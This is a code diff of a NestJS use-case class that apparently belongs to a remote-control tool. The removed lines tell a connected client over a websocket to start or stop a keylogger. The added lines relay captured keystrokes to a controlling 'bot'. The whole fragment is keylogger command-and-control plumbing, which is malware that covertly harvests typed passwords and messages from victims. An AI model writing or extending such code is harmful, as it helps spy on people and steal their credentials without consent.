@@ -1,45 +1,13 @@
-import { KeyLoggerRepository } from "@/src/modules/client/domain/keylogger.repository";
-import { WsClientRepository } from "@/src/modules/ws-client/domain/ws-client.repository";
-import { ControllerRepository } from "@/src/repository/db/controller/controller.repository";
 import { Injectable } from "@nestjs/common";
+import { WsBotGateway } from "../../infrastructure/ws-bot.gateway";
 
 @Injectable()
 export class WsBotKeyLoggerUseCase {
-  constructor(
-    private readonly keyLoggerRepository: KeyLoggerRepository,
-    private readonly controllerRepository: ControllerRepository,
-    private readonly wsClientRepository: WsClientRepository,
-  ) {}
+  constructor(private readonly wsBotGateway: WsBotGateway) {}
 
-  async startListening(controllerid: string) {
-    const { activeclient } =
-      await this.controllerRepository.getControllerById(controllerid);
-
-    if (!activeclient) return;
-
-    this.keyLoggerRepository.createKeyLogger(activeclient);
-
-    const client = this.wsClientRepository.getClient(activeclient);
-
-    if (!client) {
-      throw new Error("Client not found");
-    }
-
-    client.socket.emit("startKeyLogger");
-  }
-
-  async stopListening(controllerid: string) {
-    const { activeclient } =
-      await this.controllerRepository.getControllerById(controllerid);
-    if (!activeclient) return;
-    this.keyLoggerRepository.stopKeyLogger(activeclient);
-
-    const client = this.wsClientRepository.getClient(activeclient);
-
-    if (!client) {
-      throw new Error("Client not found");
-    }
-
-    client.socket.emit("stopKeyLogger");
+  async sendKeyLoggerToBot(controllerid: string, keys: string[]) {
+    return this.wsBotGateway.sendEventToBot(controllerid, "sendKeyLogger", {
+      keys,
+    });
   }
 }
